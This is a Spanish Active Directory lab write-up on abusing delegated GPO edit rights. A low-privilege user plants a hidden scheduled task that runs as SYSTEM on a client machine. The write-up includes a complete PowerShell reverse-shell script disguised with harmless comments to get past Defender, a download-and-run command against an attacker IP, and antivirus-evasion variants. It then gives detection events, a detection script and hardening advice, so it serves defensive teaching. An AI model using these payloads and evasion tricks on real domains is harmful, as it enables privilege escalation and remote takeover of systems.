# GPO Permissions / GPO Files (Abuso de permisos de delegación en Group Policy Objects)

> ⚠️ Fines educativos, laboratorio aislado — ver disclaimer completo en el [README](../README.md).

## Resumen del ataque

Si tengo permisos de **edición** sobre una **Group Policy Object (GPO)**, aunque no sea administrador de dominio, puedo modificar esa GPO para mis fines.

Si esa GPO aplica a equipos o usuarios con privilegios (o al menos a muchos equipos), puedo lograr ejecución remota de código, escalada de privilegios, persistencia, distribución de malware masiva...

Es muy común que los admins deleguen permisos sobre GPOs a usuarios concretos (soporte, developers, equipos de IT descentralizados...) pensando que es "bajo riesgo", pero la realidad es que equivale a dar acceso SYSTEM a esos equipos.

## Objetivo del ataque

Quiero demostrar cómo, con permisos limitados en AD (en este caso el usuario `pedri`), puedo comprometer equipos o usuarios en mi ámbito si tengo permiso de "Editar configuración" sobre una GPO que les aplica.

## Escenario del lab

```
Dominio:     adlab.local
OU atacada:  Soporte (contiene JORGE-CLIENTE)
GPO:         GPO-SOPORTE (vinculada a OU Soporte)
Atacante:    pedri (usuario de dominio, permiso "Editar configuración" en GPO-SOPORTE)
Objetivo:    JORGE-CLIENTE (equipo en OU Soporte)
Carga:       Reverse shell PowerShell (descargada desde Kali)
```

## Configurar la vulnerabilidad

### 1.1 Crear la OU y mover el equipo

```powershell
# En DC01, desde Usuarios y equipos de AD (dsa.msc)
# 1. Click derecho en adlab.local → Nueva → Unidad organizativa
# 2. Nombre: "Soporte"
# 3. Mover JORGE-CLIENTE desde Computers a esta OU
```

![Creación de la OU "Soporte" en Usuarios y equipos de AD y movimiento de JORGE-CLIENTE hacia ella](<img/Crear OU y moviendo PC.png>)

### 1.2 Crear la GPO vinculada a la OU

```powershell
# En DC01, desde Group Policy Management (gpmc.msc)
# 1. Click derecho en OU "Soporte" → "Crear un GPO en este dominio y vincularlo aquí..."
# 2. Nombre: "GPO-SOPORTE"
```

### 1.3 Delegar permisos de edición a `pedri`

```powershell
# En gpmc.msc, dentro de "Objetos de directiva de grupo"
# 1. Seleccionar GPO-SOPORTE
# 2. Pestaña "Delegación"
# 3. Clic en "Agregar..."
# 4. Buscar y añadir usuario: pedri
# 5. Nivel de permiso: "Editar configuración"
# 6. Aceptar
```

Resultado esperado: `pedri` aparecerá en la lista de delegación con permiso de "Editar configuración".

![Pestaña Delegación de GPO-SOPORTE mostrando a pedri con permiso "Editar configuración"](<img/GPO para soporte con pedri.png>)

## Ejecutar el ataque

### 2.1 Preparar la carga maliciosa (Kali)

Creo un script PowerShell que se conecte en reverse shell (lo he tenido que comentar para evitar detección de Defender, que tambien digo yo, vaya evasión...):

```bash
cat > /var/www/html/shell.ps1 << 'EOF'
# Script de utilidad remota para administración de sistemas
# Propósito: Herramienta de diagnóstico y soporte técnico

# Configurar parámetros de conexión
$ip = '100.100.100.20'  # IP del servidor de soporte
$puerto = 4444          # Puerto de comunicación
# Crear cliente TCP para establecer canal seguro
$client = New-Object System.Net.Sockets.TCPClient($ip, $puerto)
# Obtener stream de red
$stream = $client.GetStream()
# Buffer para recibir datos
[byte[]]$bytes = 0..65535 | % {0}
# Bucle principal de lectura/escritura
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    # Decodificar datos recibidos
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    # Ejecutar comando y capturar salida
    $resultado = (iex $data 2>&1 | Out-String)
    # Construir respuesta con prompt
    $respuesta = $resultado + 'PS ' + (pwd).Path + '> '
    # Codificar respuesta a bytes
    $respuestaByte = ([text.encoding]::ASCII).GetBytes($respuesta)
    # Enviar datos al servidor
    $stream.Write($respuestaByte, 0, $respuestaByte.Length)
    # Limpiar buffer
    $stream.Flush()
}
# Cerrar conexión
$client.Close()
EOF
```

![Editando shell.ps1 con nano en Kali antes de servirlo](<img/Montando script reverse shell.png>)

Levanto un servidor web para poder pasar el script y a su vez me pongo en escucha con netcat:

```bash
python3 -m http.server 80 
```

![Servidor HTTP levantado en Kali sirviendo shell.ps1](<img/Guardamos scripts y levantamos servidor.png>)

Levanto el listener:

```bash
nc -lvnp 4444
```

![Netcat en escucha en el puerto 4444 esperando la conexión de vuelta](<img/netcat escuchando.png>)

### 2.2 Inyectar la tarea programada maliciosa (como `pedri`, desde JORGE-CLIENTE)

Requisitos: necesito instalar RSAT en JORGE-CLIENTE, que está disponible como capability de gestión de Windows:

`Add-WindowsCapability -Online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0`

![Instalando la capability de RSAT y abriendo gpmc.msc en JORGE-CLIENTE](<img/instalamos capability de win y abvrimos.png>)

Pasos:

1. Abro `gpmc.msc` como `pedri`.

![Consola de Administración de directivas de grupo recién abierta, con acceso a todo el bosque adlab.local](<img/Puedo ver toda la estructura.png>)

Aunque mi permiso de edición es solo sobre GPO-SOPORTE, puedo ver toda la estructura de GPOs del dominio, incluidas las que no puedo editar. Esto pasa porque por defecto "Usuarios autentificados" tiene permiso de lectura sobre todas las GPOs, así que de regalo tengo reconocimiento gratis del entorno.

![Navegando por GPOs que no puedo editar, viendo sus detalles y fechas de modificación](<img/puedo ver estructura.png>)

2. Navego a: **Objetos de directiva de grupo → GPO-SOPORTE**
3. Click derecho → **Editar...**
4. Dentro del editor, voy a: **Configuración del equipo → Preferencias → Configuración del Panel de control → Tareas programadas**
5. Click derecho → **Nuevo → Tarea inmediata (al menos Windows 7)**
6. **Pestaña General**:
   - Nombre: `NombreDiscreto_Updatedrivers` (algo que no levante sospechas)
   - Usuario o grupo: `SYSTEM` (`NT AUTHORITY\SYSTEM`)
   - Marco "Ejecutar tanto si el usuario inició sesión como si no"
   - Marco "Ejecutar con los privilegios más altos"
   - Marco "Oculta"

7. **Pestaña Acciones → Nueva...**:
   - Acción: **Iniciar un programa**
   - Programa: `powershell.exe`
   - Argumentos (versión comentada para evitar detección):
   ```
   -WindowStyle Hidden -Command "$c = New-Object Net.WebClient; # Crear cliente HTTP para descargar utilidad
   $s = $c.DownloadString('http://100.100.100.20/shell.ps1'); # Obtener script de soporte remoto
   iex $s  # Ejecutar script de diagnóstico"
   ```
   
   Nota: si el antivirus sigue bloqueando, uso alternativas:
   ```
   -WindowStyle Hidden -Command "$w = New-Object Net.WebClient; $w.Proxy = [Net.GlobalProxySelection]::GetEmptyWebProxy(); $d = $w.DownloadString('http://100.100.100.20/shell.ps1'); . ([scriptblock]::Create($d))"
   ```

![Configurando la tarea programada NombreDiscreto_Updatedrivers en GPO-SOPORTE para ejecutarse como SYSTEM](<img/Creo tarea para explotar.png>)

8. Acepto y cierro el editor.

### 2.3 Aplicar la política y ejecutar

En `JORGE-CLIENTE`, como administrador, ejecuto:

```powershell
gpupdate /force
```

La tarea debería ejecutarse automáticamente en el siguiente refresh de GPO. Para forzarla, desde la reverse shell en Kali:

```powershell
# Desde la reverse shell en Kali
Get-ScheduledTask -TaskName "NombreDiscreto_Updatedrivers" | Start-ScheduledTask
```

Consigo la conexión entrante en `nc`, con una shell como `SYSTEM` en `JORGE-CLIENTE`.

![Shell inversa como SYSTEM en JORGE-CLIENTE tras ejecutar la tarea, junto al log del servidor HTTP sirviendo shell.ps1](<img/ejecutamos tarea y conseguimos una shell inversa.png>)

## Paso 3 Indicadores de Compromiso (IoCs)

### En DC01 (Visor de eventos → Seguridad):

| Event ID | Descripción | Buscar |
|----------|-------------|--------|
| **4697** | Se creó una tarea programada | Nombre de tarea maliciosa, usuario creador |
| **4688** | Se ha creado un nuevo proceso | PowerShell ejecutándose como SYSTEM |
| **5136** | Cambio de atributo de objeto directorio | Modificación de GPO en SYSVOL |
| **5139** | Objeto de directorio creado | Creación de tarea programada en directorio |

### En SYSVOL:

```
\\adlab.local\SYSVOL\adlab.local\Policies\{GPO-SOPORTE-GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
```

Buscar archivos XML con tareas creadas recientemente, especialmente que ejecuten comandos de PowerShell.

### En el equipo comprometido (JORGE-CLIENTE):

```powershell
# Visor de eventos → Sistema
# Event ID 1000 (Task Scheduler)
# Búscar tareas ejecutadas como SYSTEM con PowerShell

# También revisar:
Get-ScheduledTask | Where-Object {$_.Principal.UserId -match "SYSTEM"} | Select-Object TaskName, Author, Date
```

## Paso 4 Script de detección PowerShell

```powershell
# DetectGPOPermissions.ps1
# Detecta usuarios con permisos de edición en GPOs

param(
    [string]$Domain = (Get-ADDomain).DNSRoot,
    [string]$OutputPath = "C:\temp\GPODetection.txt"
)

Write-Host "[*] Buscando GPOs con permisos de delegación anómalos..." -ForegroundColor Yellow

$gpos = Get-GPO -All -Domain $Domain
$suspiciousGPOs = @()

foreach ($gpo in $gpos) {
    try {
        $acl = Get-GPPermission -Guid $gpo.Id -All -Domain $Domain
        
        foreach ($ace in $acl) {
            # Detectar usuarios (no grupos) con permiso de "Editar configuración"
            if ($ace.Permission -eq "Edit" -and $ace.Trustee.SidType -eq "User") {
                $suspiciousGPOs += [PSCustomObject]@{
                    GPOName = $gpo.DisplayName
                    User = $ace.Trustee.Name
                    Permission = $ace.Permission
                    Timestamp = Get-Date
                }
                
                Write-Host "[SOSPECHOSO] Usuario '$($ace.Trustee.Name)' tiene permiso EDITAR sobre GPO '$($gpo.DisplayName)'" -ForegroundColor Red
            }
        }
    } catch {
        Write-Host "[-] Error al revisar GPO $($gpo.DisplayName): $_" -ForegroundColor Gray
    }
}

# Buscar tareas programadas inyectadas vía GPO Preferences
Write-Host "`n[*] Buscando tareas programadas en SYSVOL..." -ForegroundColor Yellow

$sysvolPath = "\\$Domain\SYSVOL\$Domain\Policies"
$taskXmls = Get-ChildItem -Path $sysvolPath -Recurse -Filter "ScheduledTasks.xml" -ErrorAction SilentlyContinue

foreach ($xmlFile in $taskXmls) {
    try {
        [xml]$taskXml = Get-Content $xmlFile.FullName
        $tasks = $taskXml.ScheduledTasks.Task
        
        if ($tasks) {
            foreach ($task in $tasks) {
                if ($task.Properties.Command -match "powershell|cmd|iex|downloadstring") {
                    Write-Host "[SOSPECHOSO] Tarea maliciosa detectada en: $($xmlFile.FullName)" -ForegroundColor Red
                    Write-Host "    Comando: $($task.Properties.Command)" -ForegroundColor Red
                    
                    $suspiciousGPOs += [PSCustomObject]@{
                        Type = "MaliciousTask"
                        GPOPath = $xmlFile.FullName
                        Command = $task.Properties.Command
                        Timestamp = $xmlFile.LastWriteTime
                    }
                }
            }
        }
    } catch {
        Write-Host "[-] Error al parsear $($xmlFile.FullName): $_" -ForegroundColor Gray
    }
}

# Guardar resultados
$suspiciousGPOs | Export-Csv -Path $OutputPath -NoTypeInformation
Write-Host "`n[+] Resultados guardados en: $OutputPath" -ForegroundColor Green
Write-Host "[+] Total hallazgos sospechosos: $($suspiciousGPOs.Count)" -ForegroundColor Green

return $suspiciousGPOs
```

Uso:
```powershell
.\DetectGPOPermissions.ps1 -Domain "adlab.local"
```

## Mitigación y Hardening

### 1. Auditoría de GPOs

```powershell
# Auditar quién tiene permisos sobre cada GPO
Get-GPO -All | ForEach-Object {
    Write-Host "GPO: $($_.DisplayName)"
    Get-GPPermission -Guid $_.Id -All | Where-Object {$_.Permission -eq "Edit"}
}
```

### 2. Delegación restrictiva

Siempre nos bassaremos en la norma del minimo privilegio viable.

- **Evitar** delegar "Editar configuración" completo a usuarios normales.
- Si es necesario delegar, crear GPOs **específicas y limitadas** para ese usuario.
- Delegar mejor a **grupos** que a usuarios individuales.

### 3. Restringir visibilidad de GPOs

Por defecto, **"Usuarios autentificados"** puede **leer** todas las GPOs del dominio. Esto da reconocimiento gratuito a atacantes, igual que antes ai un usuario no necesita ese privilegio para desarrollar su actividad deberiamos quyitarlo y aplicar la norma del minimo privilegio viable:

```powershell
# En una GPO sensible, remover permiso de lectura a "Usuarios autentificados"
# y añadir solo a grupos específicos.

Get-GPPermission -Guid "GPO-GUID" -All | Where-Object {$_.Trustee.Name -eq "Usuarios autentificados"}
# Eliminar ese permiso
```

### 4. Monitorear SYSVOL

```powershell
# Auditar cambios en SYSVOL (ScheduledTasks.xml)
Get-ChildItem -Path "\\adlab.local\SYSVOL" -Recurse -Filter "*.xml" | 
    Where-Object {$_.LastWriteTime -gt (Get-Date).AddHours(-24)} |
    Select-Object FullName, LastWriteTime
```

### 5. Activar auditoría completa en DC01

En `secpol.msc`:
- **Auditar creación de procesos**: ON
- **Auditar eventos de seguridad del sistema**: ON
- **Auditar acceso a objetos**: ON (especialmente para SYSVOL)
- **Auditar cambios de política**: ON

### 6. Considerar protección con MFA o Privileged Access Workstations (PAWs)

Para usuarios con permisos de delegación en GPOs críticas.

## Notas importantes para el repo

1. **Información confidencial del log**: por defecto, "Usuarios autentificados" puede ver toda la estructura de GPOs, lo que da reconocimiento gratuito a atacantes, tal y como he comprobado yo mismo con `pedri` en el paso 2.2. Esto debería restringirse.

2. **Defender vs. Ataque**: Windows Defender bloqueó el payload de PowerShell en primer intento. Para un ataque real, se usaría ofuscación o se buscaría un bypass.

3. **Logs ausentes**: si no se activa auditoría en DC01, los eventos no se registran. Esto es un riesgo secundario, la organización no vería el ataque.

4. **GPO Preferences criptografía**: las GPO Preferences usan encriptación débil (AES con clave conocida). Esto permite que un atacante **descifre** credenciales almacenadas.

## Referencias

- [Microsoft: Delegate Group Policy management](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn789189(v=ws.11))
- [SANS: GPO Attack Surface](https://www.sans.org/white-papers/)
- [adsecurity.org: GPO Abuse](https://adsecurity.org/?p=2716)

**Estado**: Completado  
**Evidencia generada**: ScheduledTasks.xml en SYSVOL
